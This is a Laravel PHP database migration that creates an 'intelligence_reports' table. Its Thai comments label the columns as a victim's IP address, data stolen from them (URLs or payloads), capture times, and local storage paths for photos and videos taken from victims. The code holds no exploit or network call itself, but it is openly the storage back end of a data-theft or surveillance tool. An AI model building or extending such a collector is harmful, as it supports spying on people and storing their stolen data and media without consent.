<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up()
    {
        Schema::create('intelligence_reports', function (Blueprint $table) {
            $table->id();
            $table->string('source_ip')->nullable(); // IP ของเหยื่อ
            $table->text('leaked_data');            // ข้อมูลที่จารกรรมมาได้ (URL หรือ Payload)
            $table->timestamp('captured_at');        // เวลาที่จับสัญญาณได้
            $table->string('file_path')->nullable(); // พิกัดที่เก็บรูป/วิดีโอในเครื่องเรา
            $table->string('file_type')->nullable(); // ประเภทไฟล์ (jpg, mp4, png)
            $table->bigInteger('file_size')->default(0); // ขนาดไฟล์
            $table->timestamps();
        });
    }
    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('intelligence_reports');
    }
};
